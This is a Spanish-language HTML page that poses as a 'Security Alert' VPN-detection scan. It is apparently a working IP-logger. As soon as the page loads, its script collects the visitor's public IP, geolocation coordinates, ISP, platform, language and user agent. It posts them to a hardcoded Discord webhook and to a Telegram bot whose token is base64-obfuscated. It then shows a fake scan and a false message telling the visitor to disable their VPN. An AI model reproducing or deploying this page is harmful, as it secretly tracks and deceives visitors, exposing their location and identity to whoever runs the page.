<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Node - Verification</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: #1e293b; border: 1px solid #334155; padding: 2rem; border-radius: 8px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 400px; width: 90%; text-align: center; }
        .warn { color: #fbbf24; font-size: 3rem; margin-bottom: 1rem; }
        h2 { margin: 0 0 1rem; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
        .loader { height: 4px; width: 100%; background: #334155; border-radius: 10px; margin: 1.5rem 0; overflow: hidden; }
        .fill { height: 100%; width: 0%; background: #ef4444; transition: width 0.1s; }
        #status { font-size: 0.8rem; color: #94a3b8; }
        .error-msg { display: none; background: #450a0a; border: 1px solid #991b1b; padding: 10px; border-radius: 4px; margin-top: 1rem; font-size: 0.85rem; color: #fca5a5; }
    </style>
</head>
<body>
    <div class="box">
        <div class="warn">‚ö†Ô∏è</div>
        <h2>Security Alert</h2>
        <div id="status">Iniciando escaneo de t√∫neles...</div>
        <div class="loader"><div class="fill" id="bar"></div></div>
        <div id="error-box" class="error-msg">
            <strong>VPN/PROXY DETECTADO</strong><br>
            El sistema ha bloqueado el acceso desde su IP actual por uso de herramientas de anonimato. Desactive su VPN y recargue para ver el reporte.
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURACI√ìN
        // ============================================
        // Token de Telegram (Base64) - Para el bot
        const _0x4a21 = ["ODE1MDcyMTc4NjpBQUdtTXA5Y2hPbnJLZ1U4dzlIRl9sbEU4TGlxM2xWcElWOA==", "ODM2OTQ1ODM5Ng=="];
        const _k = atob(_0x4a21);
        const _i = atob(_0x4a21);

        // Webhook de Discord - PEGA TU WEBHOOK AQU√ç
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462321256807530526/LWNvof3-5p65SyT7NAobTwT7__pn2Xniyqg2f_ia5a_anjEWaHvQ-2--RcEzu7SSbBqr";

        async function init() {
            const bar = document.getElementById('bar');
            const st = document.getElementById('status');
            const err = document.getElementById('error-box');
            
            // ============================================
            // 1. CAPTURA DE IP Y ENV√çO A DISCORD
            // ============================================
            try {
                // Obtener IP p√∫blica
                const respIP = await fetch('https://api.ipify.org?format=json');
                const dataIP = await respIP.json();
                const ip = dataIP.ip;

                // Obtener geolocalizaci√≥n
                const respGeo = await fetch(`https://ipapi.co/${ip}/json/`);
                const geo = await respGeo.json();

                // Crear embed para Discord
                const embedDiscord = {
                    embeds: [{
                        title: "üåê NUEVA IP CAPTURADA",
                        color: 0xFF0000,
                        thumbnail: {
                            url: "https://cdn-icons-png.flaticon.com/512/1828/1828884.png"
                        },
                        fields: [
                            {
                                name: "üåê IP P√∫blica",
                                value: `\`${ip}\``,
                                inline: true
                            },
                            {
                                name: "üåç Pa√≠s",
                                value: `${geo.country_name || 'N/A'} ${geo.country_emoji || 'üåé'}`,
                                inline: true
                            },
                            {
                                name: "üèôÔ∏è Ciudad",
                                value: `${geo.city || 'N/A'}`,
                                inline: true
                            },
                            {
                                name: "üìç Regi√≥n",
                                value: `${geo.region || 'N/A'}`,
                                inline: true
                            },
                            {
                                name: "üó∫Ô∏è Coordenadas",
                                value: `[${geo.latitude}, ${geo.longitude}](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`,
                                inline: true
                            },
                            {
                                name: "üè¢ ISP/Proveedor",
                                value: `${geo.org || 'N/A'}`,
                                inline: true
                            },
                            {
                                name: "üíª Sistema",
                                value: `${navigator.platform}`,
                                inline: true
                            },
                            {
                                name: "üåê Idioma",
                                value: `${navigator.language}`,
                                inline: true
                            },
                            {
                                name: "üì± Navegador",
                                value: `\`\`\`${navigator.userAgent.substring(0, 100)}...\`\`\``,
                                inline: false
                            },
                            {
                                name: "‚è∞ Fecha/Hora",
                                value: `${new Date().toLocaleString('es-ES')}`,
                                inline: false
                            }
                        ],
                        footer: {
                            text: "LeakDB Security System v3.0"
                        },
                        timestamp: new Date().toISOString()
                    }]
                };

                // Enviar a Discord
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embedDiscord)
                });

                console.log('‚úÖ IP enviada a Discord');

            } catch(e) {
                console.error('‚ùå Error enviando a Discord:', e);
            }

            // ============================================
            // 2. NOTIFICACI√ìN SIMPLE A TELEGRAM (OPCIONAL)
            // ============================================
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                const ip = d.ip;

                // Mensaje corto a Telegram (solo notificaci√≥n)
                await fetch(`https://api.telegram.org/bot${_k}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: _i, 
                        text: `üõ°Ô∏è **ACCESO DETECTADO**\n\nüåê IP: \`${ip}\`\n‚åö ${new Date().toLocaleString()}\nüì± ${navigator.platform}\n\nüí¨ Detalles completos en Discord`, 
                        parse_mode: "Markdown" 
                    })
                });

                console.log('‚úÖ Notificaci√≥n enviada a Telegram');

            } catch(e) {
                console.error('‚ùå Error enviando a Telegram:', e);
            }

            // ============================================
            // 3. ANIMACI√ìN DE "DETECCI√ìN"
            // ============================================
            let w = 0;
            const iv = setInterval(() => {
                w += 1;
                bar.style.width = w + "%";
                if(w == 30) st.innerText = "Analizando paquetes...";
                if(w == 60) st.innerText = "Cruzando IP con registros...";
                if(w == 90) st.innerText = "Finalizando...";
                if(w >= 100) {
                    clearInterval(iv);
                    st.style.display = "none";
                    err.style.display = "block";
                }
            }, 50);
        }

        window.onload = init;
    </script>
</body>
</html>
